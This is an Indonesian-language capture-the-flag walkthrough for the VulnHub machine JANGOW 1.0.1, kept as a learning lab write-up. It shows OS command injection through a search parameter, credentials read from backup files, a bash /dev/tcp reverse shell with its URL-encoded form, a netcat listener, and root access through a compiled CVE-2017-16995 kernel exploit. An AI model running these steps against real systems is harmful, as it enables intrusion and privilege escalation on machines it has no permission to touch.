# CTF JANGOW: 1.0.1 
Vulnerable Server: [JANGOW: 1.0.1](https://www.vulnhub.com/entry/jangow-101,754/)

## Requirement
- [Virtual Box](https://www.virtualbox.org/)
- [Kali linux](https://www.kali.org/get-kali/#kali-virtual-machines)
- [OPNsense](https://opnsense.org/) (optional)
- [JANGOW: 1.0.1](https://download.vulnhub.com/jangow/jangow-01-1.0.1.ova)

## Arsitektur Lab

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/arsitektur%20sistem.png)

## Penyelesaian
- Melakukan konfigurasi routing pada Kali Linux
```sh
ip route add 192.168.1.0/24 via 192.168.100.7
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%201.JPG)

- Menemukan IP Address target
```sh
nmap -sn 192.168.1.0/24
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%202.JPG)

- Melakukan Port Scanning pada target
```sh
nmap -sC -sV 192.168.1.103
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%203.JPG)

- Sekarang kita coba buka halaman web lewat browser dengan URL `http://<IP_server>`

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%204.JPG)

- Pada halaman diatas terdapat menu `Buscar` yang jika diklik akan diarahkan ke halaman kosong

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%205.JPG)

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%206.JPG)

- Jika diterjemahkan lewat google translate, `Buscar` adalah bahasa spanyol yang berarti `mencari`

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%207.JPG)

- Jika kita ketikkan `ls` akan muncul list file dan folder yang ada di direktori aktif saat ini. Hal ini memungkinkan kita untuk melakukan serangan **OS command injection**

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%208.JPG)

- Sekarang kita ketik `ls -la` untuk melihat seluruh file dan folder yang ada di direktori tersebut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%209.JPG)

- Tekan `Ctrl+U` untuk tampilan yang lebih rapi

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2010.JPG)

- Ketik perintah berikut untuk melihat seluruh isi folder wordpress
```sh
ls -la wordpress
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2011.JPG)

- Buka isi file `config.php` yang terdapat dalam folder wordpress
```sh
cat wordpress/config.php
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2012.JPG)

- Pada source code diatas ditemukan username dan password. Sekarang kita coba username dan password tersebut untuk mengakses FTP server. Setelah dicoba ternyata tidak bisa digunakan untuk mengakses FTP server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2013.JPG)

- Sekarang kita coba ketik `pwd` untuk mengetahui posisi direktori

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2014.JPG)

- Posisi direktori saat ini adalah di `/var/www/html/site` jadi kita bisa mengetahui file dan folder apa saja di direktori `/var/www/html` dengan perintah berikut
```sh
ls -la /var/www/html
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2015.JPG)

- Kita berhasil menemukan file `.backup` di direktori `/var/www/html`. Sekarang kita buka isi file tersebut dengan perintah sebagai berikut
```sh
cat /var/www/html/.backup
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2016.JPG)

- Sekarang kita coba username dan password tersebut untuk mengakses FTP server. Setelah dicoba, kita berhasil login ke FTP server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2017.JPG)

- Setelah kita telusuri tidak ada file menarik di FTP tersebut

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2018.JPG)

- Sekarang kita bisa mencoba menjalankan **Reverse Shell** melalui **OS command injection**
- Ketik perintah berikut untuk mengetahui IP Kali Linux
```sh
ifconfig
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2019.JPG)

- Setelah itu kita gunakan IP Kali Linux untuk menulis perintah Reverse Shell sebagai berikut
```sh
/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.5/443 0>&1'
```
- Encode terlebih dahulu perintah diatas dengan URL encoder https://www.urlencoder.org/
```sh
%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.5%2F443%200%3E%261%27
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2020.JPG)

- Buat listener netcat pada port 443 sesuai reverse shell diatas
```sh
nc -lnvp 443
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2021.JPG)

- Buka tab baru dan akses kembali URL `http://<IP_Server>/site/busque.php?buscar=`

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2022.JPG)

- Copy perintah reverse shell yang sudah terencode diatas dan paste setelah tanda `=` pada URL ditas dan tekan enter untuk menjalankan

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2023.JPG)

- Netcat berhasil terkoneksi

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2024.JPG)

- Buat shell diatas menjadi interaktif terminal
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2025.JPG)

- Switch ke user `jangow01`
```sh
su jangow01
abygurl69
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2026.JPG)

- Kita berhasil menemukan user flag
```sh
cd /home/jangow01
cat user.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2027.JPG)

- Unduh program [linpeas.sh](https://github.com/carlospolop/PEASS-ng/tree/master) untuk menemukan jalur privilage escalation di linux
- Upload file linpeas.sh ke server dengan FTP
```sh
ftp 192.168.1.103
jangow01
abygurl69
cd /home/jangow01
put linpeas.sh
exit
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2028.JPG)

- Pastikan file `linpeas.sh` berhasil terupload. Jika sudah, tambahkan akses execute dan jalankan program tersebut
```sh
chmod +x linpeas.sh
./linpeas.sh
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2029.JPG)

- Terdapat informasi bahwa terdapat kerentan `CVE-2017-16995` pada server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2030.JPG)

- Download exploit CVE-2017-16995 di web https://www.exploit-db.com/exploits/45010

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2031.JPG)

- Setelah berhasil didownload, upload file program `45010.c` ke server menggunakan FTP server
```sh
ftp 192.168.1.103
jangow01
abygurl69
cd /home/jangow01
put 45010.c
exit
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2032.JPG)

- Setelah berhasil terupload ke server. Compile file program `45010.c` menggunakan `gcc`
```sh
gcc 45010.c -o cve-2017-16995
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2033.JPG)

- Sekarang jalankan file `cve-2017-16995` dari hasil kompile diatas. Setelah dijalankan kita berhasil mendapatkan akses user `root`
```sh
./cve-2017-16995
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2034.JPG)

- Kita berhasil menemukan root flag
```sh
cat /root/proof.txt
```

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/jangow%2035.JPG)

## Hasil IDS OPNsense
- Deteksi aktivitas penggunaan nmap pada jaringan

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/ids%201.JPG)

- Deteksi aktivitas penggunaan nmap pada server

![alt text](https://github.com/rahardian-dwi-saputra/labs-pentest-vulnhub/blob/main/jangow01/assets/ids%202.JPG)

## Peringatan
Semua materi yang disajikan disini hanya digunakan sebagai media pembelajaran. Penulis tidak bertanggung jawab atas penyalahgunaan dari materi tersebut